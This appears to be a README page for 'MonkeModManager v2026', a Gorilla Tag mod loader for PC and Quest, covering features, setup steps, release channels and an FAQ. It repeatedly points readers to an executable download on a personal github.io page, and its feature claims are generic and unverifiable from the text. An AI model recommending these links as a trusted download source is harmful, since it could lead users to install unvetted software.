# MonkeModManager v2026 - Gorilla Tag Loader and Update Utility

> A PC and Quest mod manager for Gorilla Tag that streamlines installation, separates configurations with profiles, and prepares updates before the game starts.

[![Loader](https://img.shields.io/badge/Type-Loader-blue?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-PC%20and%20Quest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/carterpahughes1621/monkemodmanager-mod-loader?style=flat-square)](https://github.com/carterpahughes1621/monkemodmanager-mod-loader)

---

<p align="center">
  <a href="https://carterpahughes1621.github.io/monkemodmanager-mod-loader/">
    <img src="https://img.shields.io/badge/Download-MonkeModManager%20Loader-brightgreen?style=for-the-badge" alt="Download MonkeModManager Loader">
  </a>
</p>

> **[Download MonkeModManager Loader](https://carterpahughes1621.github.io/monkemodmanager-mod-loader/)**

---

[Download Latest Build](https://carterpahughes1621.github.io/monkemodmanager-mod-loader/)

---

## Overview

MonkeModManager provides a repeatable way to handle Gorilla Tag mods on PC and Quest. It organizes installation, prepares platform-specific files, and uses profiles to keep separate mod configurations independent. This reduces the need for repeated manual file management when changing between setups.

The manager can also identify conflicting mods and assist with resolving them before deployment. Offline operation, rollback tools, and signature verification support a more controlled process for updating files, changing profiles, and returning to an earlier configuration when necessary.

---

## Core Capabilities

- Deploys Gorilla Tag mod files on both PC and Quest
- Uses profiles to maintain separate play and testing configurations
- Detects incompatible mod combinations and assists with conflict resolution
- Restores an earlier working setup through one-click rollback
- Supports offline workflows when network access is unavailable or unnecessary
- Checks signatures to validate downloaded or packaged files
- Offers a multilingual user interface
- Integrates with APIs for update, metadata, and release-related tasks

---

## Getting Started

1. Obtain the latest build from the release page.
2. Unpack the archive into a local folder with write access.
3. Open the manager and select either PC or Quest.
4. Choose an existing profile or create one for the mods you plan to use.
5. Inspect the detected files, address any reported conflicts, and apply the deployment.

For command-line use, store profiles in a dedicated directory and reuse them as needed:

MonkeModManager.exe --profile default --platform pc  
MonkeModManager.exe --profile quest-test --rollback

When your build provides a settings file, use it to retain the active profile, offline setting, and API options between launches.

---

## Release Channels

| Channel | Purpose | Notes |
| --- | --- | --- |
| Stable | Regular use | Recommended for a consistent setup |
| Beta | Early access to changes | Useful for testing new mod workflow updates |
| Nightly | Latest build output | Best for experimentation and troubleshooting |
| Manual | User-managed updates | Download and apply releases yourself |

---

## Troubleshooting Guide

- When the program will not open, check that the extracted directory allows writing and that you selected the appropriate build for your system.
- For failed downloads or API operations, verify the network connection. If suitable, enable offline mode instead.
- If a mod is missing from the interface, refresh the profile and confirm that its file is in the expected directory.
- Repeated conflicts may require removing the affected entries and recreating the profile from a clean setup.
- If rollback does not recover the earlier configuration, make sure a rollback point existed before the changes were made.
- When signature validation fails, download the package again and verify its source before continuing.

---

## Frequently Asked Questions

**Is MonkeModManager compatible with PC and Quest?**  
Yes. Its profile and deployment workflow is designed to support both platforms.

**Can separate mod configurations be stored?**  
Yes. Profiles let you switch between independent setups without recreating each one manually.

**How are conflicting mods handled?**  
The manager detects conflicts and provides guidance for resolving them before deployment.

**Can I undo an unsuccessful installation?**  
Yes. The one-click rollback function can restore a previous configuration when a rollback point is available.

**Does the manager support offline use?**  
Yes. Offline mode is available when you do not have network access or prefer not to use it.

**Does the application include validation or logs?**  
Signature verification provides validation. Depending on the release, builds may also include logs or diagnostic information.

**Will the manager remain compatible with future Gorilla Tag updates?**  
Compatibility depends on the active game and mod environment. After major updates, review your profiles and installed files.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
